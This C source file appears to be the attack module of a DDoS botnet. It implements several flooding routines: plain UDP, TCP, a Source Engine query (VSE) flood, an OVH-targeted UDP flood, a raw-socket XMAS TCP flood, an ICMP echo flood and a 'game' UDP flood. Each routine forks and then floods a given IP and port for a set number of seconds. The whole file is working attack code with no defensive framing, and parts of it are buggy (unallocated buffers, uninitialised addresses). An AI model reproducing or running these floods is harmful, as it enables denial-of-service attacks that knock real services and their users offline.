#define _GNU_SOURCE

#include <sys/socket.h>
#include <netdb.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <netinet/ip_icmp.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>

#include "headers/attack_methods.h"
#include "headers/utils.h"

char *rand_str;
char *packet;

void rand_string() {
    char rand_buf[] = {"abcdefghijklmnopqrstuvwxyz12345678910abcdefghijklmnopqrstuvwxyz"};
     srand ( time(NULL) );

    int rand_key = (rand() % 1000);

    int i;

    for(i = 0; i < util_strlen(rand_buf); i++) {
        rand_buf[i] = rand_buf[i] + rand_key;
    }
        rand_str = (char *)malloc(100);
        strcpy(rand_str, rand_buf);
}

void udpplainattack(unsigned char *target, int port, int secs){
	int attack_pid;
	attack_pid = fork();

	if(attack_pid == -1 || attack_pid > 0)
        return;

    struct sockaddr_in dest_addr;
    int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(port);
    dest_addr.sin_addr.s_addr = inet_addr(target);

    rand_string();
    
    time_t start = time(NULL);
    connect(sockfd, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

    while(1) {
        send(sockfd, payload,  util_strlen(payload), MSG_NOSIGNAL);
        if(time(NULL) >= start + secs) {
            close(sockfd);
            exit(0);
        }
    }

}

void tcpattack(unsigned char *target, int port, int secs) {
    int attack_pid;
    attack_pid = fork();

    if(attack_pid == -1 || attack_pid > 0)
        return;

    struct sockaddr_in addr;

    int sockFD = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);

    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(target);

    time_t start = time(NULL);
    connect(sockFD, (struct sockaddr *)&addr, sizeof(addr));
    while(1) {
        send(sockFD, payload, sizeof(payload), MSG_NOSIGNAL);
        if(time(NULL) >= start + secs) {
            close(sockFD);
            exit(0);
        }
    }
}

void udpvseattack(unsigned char *target, int port, int secs) {
    int attack_pid;
    attack_pid = fork();

    if(attack_pid == -1 || attack_pid > 0)
        return;

    struct sockaddr_in dest_addr;
    int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(port);
    dest_addr.sin_addr.s_addr = inet_addr(target);

    char *vseString = "\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79";
    
    time_t start = time(NULL);
    connect(sockfd, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
    while(1) {
        send(sockfd, vseString,  20, MSG_NOSIGNAL);
        if(time(NULL) >= start + secs) {
            close(sockfd);
            exit(0);
        }
    }
}

void udpovhattack(unsigned char *target, int port, int secs) {
    int attack_pid;
    attack_pid = fork();

    if(attack_pid == -1 || attack_pid > 0)
        return;

    struct sockaddr_in addr;

    int sockFD = socket(AF_INET, SOCK_DGRAM, 0);

    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(target);

    time_t start = time(NULL);
    connect(sockFD, (struct sockaddr *)&addr, sizeof(addr));
    while(1) {
        rand_string();
        send(sockFD, rand_str, 1458, MSG_NOSIGNAL);
        free(rand_str);
        if(time(NULL) >= start + secs) {
            close(sockFD);
            exit(0);
        }
    }
}

void xmasattack(unsigned char *target, int port, int secs) {
    int attack_pid;
    attack_pid = fork();

    if(attack_pid == -1 || attack_pid > 0)
        return;

    struct sockaddr_in addr;

    int sockFD = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);

    strcpy(packet, payload);
    struct iphdr *iph = (struct iphdr *)packet;
    struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);

    tcph->psh = 1;
    tcph->ack = 1;
    tcph->syn = 1;
    tcph->urg = 1;


    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(target);

    time_t start = time(NULL);
    while(1) {
        sendto(sockFD, packet, sizeof (struct iphdr) + sizeof (struct tcphdr) + 20, MSG_NOSIGNAL, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
        if(time(NULL) >= start + secs) {
            memset(packet, 0, sizeof(packet));
            close(sockFD);
            exit(0);
        }
    }
}

void icmpattack(unsigned char *target, int port, int secs) {

    int attack_pid;

    attack_pid = fork();

    if(attack_pid == -1 || attack_pid > 0)
        return;

    unsigned long daddr;
    unsigned long saddr;
    int payload_size = 0, sent, sent_size;

    int packet_size = sizeof (struct iphdr) + sizeof (struct icmphdr) + payload_size;
    char *packet = (char *) malloc (packet_size);

    struct sockaddr_in addr;

    int sockFD = socket(AF_INET, SOCK_DGRAM, 0);

    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(target);

    struct iphdr *ip = (struct iphdr *) packet;
    struct icmphdr *icmp = (struct icmphdr *) (packet + sizeof (struct iphdr));
     
    memset (packet, 0, packet_size);
 
    ip->version = 4;
    ip->ihl = 5;
    ip->tos = 0;
    ip->tot_len = htons (packet_size);
    ip->id = rand ();
    ip->frag_off = 0;
    ip->ttl = 255;
    ip->protocol = IPPROTO_ICMP;
    ip->saddr = saddr;
    ip->daddr = daddr;
    icmp->type = ICMP_ECHO;
    icmp->code = 0;
    icmp->un.echo.sequence = rand();
    icmp->un.echo.id = rand();
    icmp->checksum = 0;

    time_t start = time(NULL);
    connect(sockFD, (struct sockaddr *)&addr, sizeof(addr));
    while(1) {
        sendto(sockFD, packet, sizeof (struct iphdr) + sizeof (struct icmphdr) + 20, MSG_NOSIGNAL, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
        if(time(NULL) >= start + secs) {
            close(sockFD);
            exit(0);
        }
    }
}

void gameattack(unsigned char *target, int port, int secs) {

    int attack_pid;

    attack_pid = fork();

    if(attack_pid == -1 || attack_pid > 0)
        return;

    struct sockaddr_in dest_addr;
    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);

    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(port);
    dest_addr.sin_addr.s_addr = inet_addr(target);

    rand_string();
    
    time_t start = time(NULL);
    connect(sockfd, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
    while(1) {
        send(sockfd, payload,  200, MSG_NOSIGNAL);
        if(time(NULL) >= start + secs) {
            close(sockfd);
            exit(0);
        }
    }
}
